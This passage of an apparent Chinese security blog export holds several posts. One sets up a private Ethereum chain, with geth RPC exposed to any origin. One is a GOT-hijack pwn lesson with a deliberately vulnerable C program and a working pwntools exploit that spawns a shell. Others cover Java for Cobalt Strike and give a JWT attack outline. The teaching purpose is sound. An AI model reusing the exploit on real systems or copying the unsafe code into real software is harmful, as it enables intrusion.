class="line">                                                                                                                                                            </span><br><span class="line">Sweet, you can set this via --network=cfca next time!                                                                                                       </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">INFO [01-21|09:32:09.988] Administering Ethereum network           name=cfca                                                                                </span><br><span class="line">WARN [01-21|09:32:09.988] No previous configurations found         path=/home/michael/.puppeth/cfca                                 </span><br><span class="line">What would you like to do? (default = stats)                                                                                                                </span><br><span class="line"> 1. Show network stats                                                                                                                                      </span><br><span class="line"> 2. Configure new genesis                                                                                                                                   </span><br><span class="line"> 3. Track new remote server</span><br><span class="line"> 4. Deploy network components</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">2</span></span><br><span class="line"></span><br><span class="line">What would you like to do? (default = create)</span><br><span class="line"> 1. Create new genesis from scratch</span><br><span class="line"> 2. Import already existing genesis</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line"></span><br><span class="line">Which consensus engine to use? (default = clique)</span><br><span class="line"> 1. Ethash - proof-of-work</span><br><span class="line"> 2. Clique - proof-of-authority</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line"></span><br><span class="line">Which accounts should be pre-funded? (advisable at least one)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">0x</span></span><br><span class="line"></span><br><span class="line">Should the precompile-addresses (0x1 .. 0xff) be pre-funded with 1 wei? (advisable yes)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line">Specify your chain/network ID if you want an explicit one (default = random)</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">6996</span>     </span><br><span class="line">INFO [01-21|09:33:22.523] Configured new genesis block </span><br><span class="line"></span><br><span class="line">What would you like to do? (default = stats)</span><br><span class="line"> 1. Show network stats</span><br><span class="line"> 2. Manage existing genesis</span><br><span class="line"> 3. Track new remote server</span><br><span class="line"> 4. Deploy network components</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">2</span></span><br><span class="line"></span><br><span class="line"> 1. Modify existing configurations</span><br><span class="line"> 2. Export genesis configurations</span><br><span class="line"> 3. Remove genesis configuration</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">2</span></span><br><span class="line"></span><br><span class="line">Which folder to save the genesis specs into? (default = current)</span><br><span class="line">  Will create cfca.json, cfca-aleth.json, cfca-harmony.json, cfca-parity.json</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">INFO [01-21|09:34:23.364] Saved native genesis chain spec          path=cfca.json</span></span><br><span class="line">INFO [01-21|09:34:23.365] Saved genesis chain spec                 client=aleth path=cfca-aleth.json</span><br><span class="line">INFO [01-21|09:34:23.366] Saved genesis chain spec                 client=parity path=cfca-parity.json</span><br><span class="line">INFO [01-21|09:34:23.367] Saved genesis chain spec                 client=harmony path=cfca-harmony.json</span><br><span class="line"></span><br><span class="line">What would you like to do? (default = stats)</span><br><span class="line"> 1. Show network stats</span><br><span class="line"> 2. Manage existing genesis</span><br><span class="line"> 3. Track new remote server</span><br><span class="line"> 4. Deploy network components</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">^C</span></span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ ls</span><br><span class="line">cfca-aleth.json  cfca-harmony.json  cfca.json  cfca-parity.json</span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ geth --datadir . init cfca.json </span><br><span class="line">INFO [01-21|09:42:29.231] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [01-21|09:42:29.231] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">INFO [01-21|09:42:29.231] Set global gas cap                       cap=25000000</span><br><span class="line">INFO [01-21|09:42:29.231] Allocated cache and file handles         database=/home/michael/blockchain/ChainSkills/private/geth/chaindata cache=16.00MiB handles=16</span><br><span class="line">INFO [01-21|09:42:29.318] Writing custom genesis block </span><br><span class="line">INFO [01-21|09:42:29.325] Persisted trie from memory database      nodes=354 size=50.23KiB time=&quot;778.382µs&quot; gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B</span><br><span class="line">INFO [01-21|09:42:29.325] Successfully wrote genesis state         database=chaindata hash=&quot;747b68…5aa3aa&quot;</span><br><span class="line">INFO [01-21|09:42:29.325] Allocated cache and file handles         database=/home/michael/blockchain/ChainSkills/private/geth/lightchaindata cache=16.00MiB handles=16</span><br><span class="line">INFO [01-21|09:42:29.452] Writing custom genesis block </span><br><span class="line">INFO [01-21|09:42:29.467] Persisted trie from memory database      nodes=354 size=50.23KiB time=4.035487ms  gcnodes=0 gcsize=0.00B gctime=0s livenodes=1 livesize=0.00B</span><br><span class="line">INFO [01-21|09:42:29.467] Successfully wrote genesis state         database=lightchaindata hash=&quot;747b68…5aa3aa&quot;</span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="创建账户"><a href="#创建账户" class="headerlink" title="创建账户"></a>创建账户</h3><p>每个节点都可以自己创建账户，加入节点前可自行创建账户，方便挖矿。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ geth --datadir . account new</span><br><span class="line">INFO [01-21|09:43:57.608] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [01-21|09:43:57.608] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Password: </span><br><span class="line">Repeat password: </span><br><span class="line"></span><br><span class="line">Your new key was generated</span><br><span class="line"></span><br><span class="line">Public address of the key:   0x133ee7568C6a06155Bfd31CCDd9b4ab5e6194702</span><br><span class="line">Path of the secret key file: keystore/UTC--2021-01-21T01-44-03.500559011Z--133ee7568c6a06155bfd31ccdd9b4ab5e6194702</span><br><span class="line"></span><br><span class="line">- You can share your public address with anyone. Others need it to interact with you.</span><br><span class="line">- You must NEVER share the secret key with anyone! The key controls access to your funds!</span><br><span class="line">- You must BACKUP your key file! Without the key, it&#x27;s impossible to access account funds!</span><br><span class="line">- You must REMEMBER your password! Without the password, it&#x27;s impossible to decrypt the key!</span><br><span class="line"></span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ geth --datadir . account new</span><br><span class="line">INFO [01-21|09:44:24.251] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [01-21|09:44:24.251] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Password: </span><br><span class="line">Repeat password: </span><br><span class="line"></span><br><span class="line">Your new key was generated</span><br><span class="line"></span><br><span class="line">Public address of the key:   0xD7204F8c8dF887dC32C7202FbCEfFA43793eb2AE</span><br><span class="line">Path of the secret key file: keystore/UTC--2021-01-21T01-44-26.870996945Z--d7204f8c8df887dc32c7202fbceffa43793eb2ae</span><br><span class="line"></span><br><span class="line">- You can share your public address with anyone. Others need it to interact with you.</span><br><span class="line">- You must NEVER share the secret key with anyone! The key controls access to your funds!</span><br><span class="line">- You must BACKUP your key file! Without the key, it&#x27;s impossible to access account funds!</span><br><span class="line">- You must REMEMBER your password! Without the password, it&#x27;s impossible to decrypt the key!</span><br><span class="line"></span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ geth --datadir . account new</span><br><span class="line">INFO [01-21|09:44:29.059] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [01-21|09:44:29.059] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Password: </span><br><span class="line">Repeat password: </span><br><span class="line"></span><br><span class="line">Your new key was generated</span><br><span class="line"></span><br><span class="line">Public address of the key:   0x8454b9158EB7f85A9830Ed40259C3fd39Cbce520</span><br><span class="line">Path of the secret key file: keystore/UTC--2021-01-21T01-44-31.766014334Z--8454b9158eb7f85a9830ed40259c3fd39cbce520</span><br><span class="line"></span><br><span class="line">- You can share your public address with anyone. Others need it to interact with you.</span><br><span class="line">- You must NEVER share the secret key with anyone! The key controls access to your funds!</span><br><span class="line">- You must BACKUP your key file! Without the key, it&#x27;s impossible to access account funds!</span><br><span class="line">- You must REMEMBER your password! Without the password, it&#x27;s impossible to decrypt the key!</span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ geth --datadir . account list</span><br><span class="line">INFO [01-21|09:45:22.372] Maximum peer count                       ETH=50 LES=0 total=50</span><br><span class="line">INFO [01-21|09:45:22.372] Smartcard socket not found, disabling    err=&quot;stat /run/pcscd/pcscd.comm: no such file or directory&quot;</span><br><span class="line">INFO [01-21|09:45:22.372] Set global gas cap                       cap=25000000</span><br><span class="line">Account #0: &#123;133ee7568c6a06155bfd31ccdd9b4ab5e6194702&#125; keystore:///home/michael/blockchain/ChainSkills/private/keystore/UTC--2021-01-21T01-44-03.500559011Z--133ee7568c6a06155bfd31ccdd9b4ab5e6194702</span><br><span class="line">Account #1: &#123;d7204f8c8df887dc32c7202fbceffa43793eb2ae&#125; keystore:///home/michael/blockchain/ChainSkills/private/keystore/UTC--2021-01-21T01-44-26.870996945Z--d7204f8c8df887dc32c7202fbceffa43793eb2ae</span><br><span class="line">Account #2: &#123;8454b9158eb7f85a9830ed40259c3fd39cbce520&#125; keystore:///home/michael/blockchain/ChainSkills/private/keystore/UTC--2021-01-21T01-44-31.766014334Z--8454b9158eb7f85a9830ed40259c3fd39cbce520</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>启动第一个节点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --networkid 6996 --mine --miner.threads 1 --datadir . --nodiscover  --http --http.addr 192.168</span><br><span class="line">.32.69 --http.port 8545 --port 30301 --http.corsdomain &quot;*&quot; --http.api eth,web3,net,personal --ipcpath ~/.ethereum/geth.ipc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">networkid: 与cfca.json中保持一致</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mine: 开始挖矿，观测到默认会使用第一个账户(eth.coinbase == Account <span class="comment">#0)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">datadir: 数据目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nodiscover: 不开启探测节点</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http: 开启http服务，即JSON-RPC</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http.addr: 指定IP地址，默认监听在127.0.0.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http.port: 8545是默认端口</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">port: 30301，这个端口还不清楚</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http.corsdomain: CORS设置</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http.api: 在RPC中开启的功能模块</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ipcpath: 指定IPC文件路径，使用`geth attach`时，geth会自动查找~/.ethereum/geth.ipc文件</span></span><br></pre></td></tr></table></figure>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-01-21-10-58-15.png"></p>
<h3 id="加入节点"><a href="#加入节点" class="headerlink" title="加入节点"></a>加入节点</h3><p>在go-ethereum目录中使用<code>make all</code>进行编译，这样会编译出除了geth之外的工具，如<code>clef</code>，后面会用到。</p>
<p>首先，将上面生成的cfca.json复制到本地，在本地创建一个文件夹来同步区块链数据等：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir local &amp;&amp; cd local</span><br><span class="line">geth --datadir . init cfca.json</span><br></pre></td></tr></table></figure>

<p>创建账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --datadir . account new</span><br></pre></td></tr></table></figure>

<p>启动clef</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clef --keystore ./keystore/ --http --chainid 6996</span><br></pre></td></tr></table></figure>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-04-43.png"></p>
<p>执行:<br><code>geth attach http://192.168.32.69:8545</code>，连接节点，当然你知道其他节点的话，也可以连接其他节点。</p>
<p>然后在控制台中查看区块链所有节点信息：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">admin.<span class="property">nodeInfo</span></span><br></pre></td></tr></table></figure>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-10-58-55.png"></p>
<p>然后复制<code>enode</code>信息，退出geth，</p>
<p>使用如下命令接入节点：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth --datadir . --bootnodes=&quot;enode://fa634d5e320df416ca87867bdb4bd4d573422021efead8c9ba84d639d352ad67cac3f8d809b3dd1b316a8eb65b059029b9f24e4f2058870d7b93b15d00197355@192.168.32.69:30301&quot; --networkid 6996 --port 30301 --http --http.po</span><br><span class="line">rt 8545 --mine --miner.threads 1 --signer http://127.0.0.1:8550</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意将原来enode信息中的`?disport=0`去掉</span></span><br></pre></td></tr></table></figure>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-13-08.png"><br>命令执行后clef会提示你进行确认。</p>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-11-23.png"><br>1处为挖矿之后收取奖励的地址，这里应该跟你创建的第一个账户相同。</p>
<h2 id="部署DAPP"><a href="#部署DAPP" class="headerlink" title="部署DAPP"></a>部署DAPP</h2><h3 id="下载源码安装"><a href="#下载源码安装" class="headerlink" title="下载源码安装"></a>下载源码安装</h3><p>将智能合约及DAPP部署到本地：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/dappuniversity/eth_swap.git</span><br><span class="line">cd eth_swap</span><br><span class="line">code . # 使用vscode对代码进行部分修改</span><br><span class="line">npm install</span><br><span class="line">npm truffle migrate</span><br><span class="line">npm run start</span><br></pre></td></tr></table></figure>


<h2 id="使用DAPP"><a href="#使用DAPP" class="headerlink" title="使用DAPP"></a>使用DAPP</h2><p>浏览器中安装插件<code>metamask</code>，在本文件夹下有提供一个安装包。<br>使用教程：<code>https://www.cnblogs.com/wanghui-garcia/p/9506721.html</code></p>
<p>浏览器本身不支持与区块链交互，我们通过浏览器插件metamask实现此功能。插件已上传nas。</p>
<h3 id="metamask账户"><a href="#metamask账户" class="headerlink" title="metamask账户"></a>metamask账户</h3><p>有两种方法：</p>
<ol>
<li>使用geth创建的账户</li>
<li>使用metamask创建账户</li>
</ol>
<p>第一种方法的创建方式见上文。<br>可在metamask中导入keystore文件夹下的账户，这个过程可能需要5-6分钟，如果浏览器提示插件未响应，请点击等待。<br>这种方式创建的好处就是可以将之前进行挖矿的账户导入到metamask，这样你的账户中就有一些ETH来做交易了。<br>如果你还没有挖过矿，账户中没有ETH，可通过geth创建账户并开始挖矿，并导入到metamask中，这样挖到的资产会及时反馈到metamask中。</p>
<p>如果能过第二种方式创建账户的话，需要在geth中导入metamask中生成的账户，会使用到创建账户时的私钥和密码，请注意保存。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">geth account import  --datadir . --password passfile ./key.prv</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">passfile: 包含账户密码的文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">key.prv: 包含私钥的文件</span></span><br></pre></td></tr></table></figure>

<p>因为我们加入节点时已经开始挖矿了，我们需要做的是将我们探矿的账户导入到metamask中。</p>
<p>首先点击账户，到展开视图中：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-19-51.png"></p>
<p>选择导入账户：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-20-21.png"></p>
<p>选择JSON文件：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-20-43.png"></p>
<p>选择文件，在弹出的文件浏览器中定位到当前目录下的<code>keystore</code>文件夹下，这里就是我们创建的账户的JSON文件，一般选择，输入使用geth创建账户时的密码：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-22-11.png"></p>
<p>点击导入：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-22-23.png"></p>
<p>导入过程需要时间，可能会提示这个，点击Wait可等待就好：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-23-26.png">v</p>
<p>我大概需要5分钟，导入成功：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-27-24.png"></p>
<p>为方便识别，我们改个名字：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-28-20.png"></p>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-28-48.png"></p>
<p>回到我们的DAPP网站，选择Miner账户：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-30-16.png"></p>
<p>刷新一下页面就可以看到我们的Miner账户的币了：<br><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-31-11.png"></p>
<p>我们可以购买100个ETH的ACFC，兑换比例是1：100：</p>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-31-58.png"></p>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-32-13.png"></p>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-32-31.png"></p>
<p><img src="/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/2021-02-04-11-32-42.png"></p>
<p>经过确认之后，我们就获得了ACFC币。后面怎么用还没相好。</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>dApp</tag>
        <tag>blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>GOT Hijack</title>
    <url>/re/pwn/GOT-Hijack.html</url>
    <content><![CDATA[<h1 id="GOT-Hijack"><a href="#GOT-Hijack" class="headerlink" title="GOT Hijack"></a>GOT Hijack</h1><p>GOT表劫持。</p>
<h2 id="GOT和PLT"><a href="#GOT和PLT" class="headerlink" title="GOT和PLT"></a>GOT和PLT</h2><blockquote>
<p>个人理解<br><code>GOT</code>, <code>global offset table</code>，全局偏移表；<code>PLT</code>，<code>procedure linkage table</code>，函数链接表。<br>GOT和PLT是<code>重定向</code>的一种实现方式。在程序编译时（动态编译），在程序中会留下一些变量和函数的“坑”，这些坑只记录了程序用到的变量和符号，但并没有真正实现的代码，而程序运行时，会由解释器或动态链接器<code>ld</code>在这些坑中填上真正变量或函数的地址，比如我们使用到<code>puts</code>函数，在二进制文件中并不会把puts函数代码编译进去，而是在<code>GOT</code>表中留下了<code>puts</code>函数的一个地址，这个地址指向<code>plt</code>表，而plt表会通过<code>dl_runtime_resolve</code>来把这个函数地址解释出来，再将这个地址填回GOT表中的坑，这时GOT表的puts函数就不会再次指向plt表，而是直接指向内存中真正puts函数的地址，这种机制叫做<code>延迟绑定</code>。<br>GOT 位于 .got.plt section 中，而 PLT 位于 .plt section中</p>
</blockquote>
<h2 id="GOT劫持"><a href="#GOT劫持" class="headerlink" title="GOT劫持"></a>GOT劫持</h2><p>GOT劫持就是通过程序的漏洞或功能，将GOT表中的函数地址修改为我们想要执行的函数或代码地址，当程序再次调用该函数时，就会跳转到我们的目标地址处开始执行，进而劫持程序执行流程。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc gothijack.c -no-pie -z execstack -o gothijack</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">0x40</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;sh\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s you name?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you want to write?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%llu&quot;</span>, &amp;addr); <span class="comment">// &lt;------- 在这里输入我们想要写数据的地址，我们改为GOT表中PUTS项的地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)addr, <span class="number">8</span>); <span class="comment">// &lt;-------------- 在这里输入我们想要写入的数据，改为win函数的地址</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>); <span class="comment">// &lt;------------------ 当程序再次调用puts函数时，由于我们劫持了GOT表中puts函数的地址，会执行我们的win函数</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s!\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>思路：<br><img src="/re/pwn/GOT-Hijack/2021-01-29-10-10-48.png"></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./Gothijack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;write?&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x601018</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Data: &quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p64(<span class="number">0x0400796</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/re/pwn/GOT-Hijack/2021-01-29-10-23-49.png"></p>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 配置Java 1.7</title>
    <url>/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html</url>
    <content><![CDATA[<p>[TOC]<br>##需求<br>Cobalt strike 用openjdk的话，不稳定，而且运行时候提示openjdk不推荐。</p>
<p>##更新步骤</p>
<ol>
<li><p>下载JDK1.7,这个版本是比较稳定的，对于cobalt strike来说。下载地址我找到过一次，后来在也找不到了，不知道为啥。JDK1.7百度网盘地址下载在后面。</p>
</li>
<li><p>将下载的jdk1.7解压缩。</p>
</li>
<li><p>在<code>/usr/lib/jvm</code>下新建<code>jdk17</code>，将解压出来的目录移动到该目录下。</p>
</li>
<li><p>运行以下三条命令，安装JDK1.7：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk17/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk17/bin/javac 1</span><br><span class="line">update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk17/bin/jar 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置JDK1.7为默认java：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --config java</span><br><span class="line">There are 2 choices for the alternative java (providing /usr/bin/java).</span><br><span class="line"></span><br><span class="line">  Selection    Path                                            Priority   Status</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* 0            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      auto mode</span><br><span class="line">  1            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      manual mode</span><br><span class="line">  2            /usr/lib/jvm/jdk17/bin/java                      1         manual mode</span><br></pre></td></tr></table></figure>
<p> 选择<code>2</code>。完成。</p>
</li>
</ol>
<p>##截图<br><img src="/images/96e085a2caa5e97c26663bb0e40147d948d162ee.png" alt="jdk2.png"></p>
<p><img src="/images/6dd796eb36b2da20640f15e5a365aee4b36a26d3.png" alt="jdk.png"></p>
<p>##JDK1.7下载<br><a href="https://pan.baidu.com/s/1jHHOxtO" title="JDK7">JDK7 百度网盘</a></p>
]]></content>
      <categories>
        <category>blaa</category>
      </categories>
  </entry>
  <entry>
    <title>JWT身份认证的攻击方式</title>
    <url>/web-sec/JWT%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>JSON Web Tokens</code> 或者<code>JWTs</code>可以作为传统<code>session</code>和<code>cookies</code>一个替代方案。由于JWTs是无状态的，并且是签名的，所以针对JWTs有一些特有的安全问题。本文介绍了几种可以检测JWT实现是否安全的方法。</p>
<h2 id="关于JWTs"><a href="#关于JWTs" class="headerlink" title="关于JWTs"></a>关于JWTs</h2><p>一个<code>JWT(Json Web Token)</code>串中包含了一个签名的数据结构，一般用作认证。JWT中包含一个密码签名，比如一个数据的HMAC签名。正是如此，只有服务器可以创建和更改令牌(Token)。</p>
<h3 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h3><h3 id="分辨JWT"><a href="#分辨JWT" class="headerlink" title="分辨JWT"></a>分辨JWT</h3><h2 id="攻击JWTs"><a href="#攻击JWTs" class="headerlink" title="攻击JWTs"></a>攻击JWTs</h2><h3 id="检测JWT中的敏感信息"><a href="#检测JWT中的敏感信息" class="headerlink" title="检测JWT中的敏感信息"></a>检测JWT中的敏感信息</h3><h3 id="更改签名算法"><a href="#更改签名算法" class="headerlink" title="更改签名算法"></a>更改签名算法</h3><h4 id="将签名算法变为none"><a href="#将签名算法变为none" class="headerlink" title="将签名算法变为none"></a>将签名算法变为none</h4><h4 id="将签名算法从RS256更改为HS256"><a href="#将签名算法从RS256更改为HS256" class="headerlink" title="将签名算法从RS256更改为HS256"></a>将签名算法从RS256更改为HS256</h4><h3 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a>破解密钥</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a 